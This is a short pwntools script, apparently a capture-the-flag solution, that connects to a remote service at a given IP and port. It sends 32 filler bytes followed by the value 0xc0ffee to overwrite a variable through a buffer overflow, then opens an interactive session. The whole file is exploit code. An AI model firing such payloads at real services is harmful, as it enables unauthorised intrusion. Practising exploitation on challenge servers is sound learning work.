from pwn import *

p = remote('165.99.163.122', 7013) # Untuk remote

offset = 32 
target_value = 0xc0ffee

payload = b'A' * offset
payload += p64(target_value)

p.sendline(payload)
p.interactive()
